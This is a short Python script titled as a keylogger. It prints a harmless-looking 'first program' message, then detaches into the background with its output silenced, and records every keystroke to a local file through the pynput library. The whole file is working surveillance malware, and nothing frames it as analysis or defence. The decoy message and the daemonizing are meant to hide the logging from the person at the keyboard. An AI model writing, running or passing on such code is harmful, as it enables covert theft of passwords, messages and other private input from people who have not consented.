# Design a simple but powerful keylogger using Python

import os
import sys
import time
from pynput import keyboard

print("This is my first program")
sys.stdout.flush()

# Daemonize (on Linux/Unix)
if hasattr(os, 'fork'):
    if os.fork():
        sys.exit(0)
    os.setsid()
    with open(os.devnull, 'w') as ff:
        os.dup2(ff.fileno(), sys.stdout.fileno())
        os.dup2(ff.fileno(), sys.stderr.fileno())

def log_keys(key):
    with open("keys.txt", "a") as ff:
        try:
            ff.write(f"key: {key.char}\n")
        except AttributeError:
            ff.write(f"key: {key}\n")

listener = keyboard.Listener(on_press=log_keys)
listener.start()

while True:
    time.sleep(1)
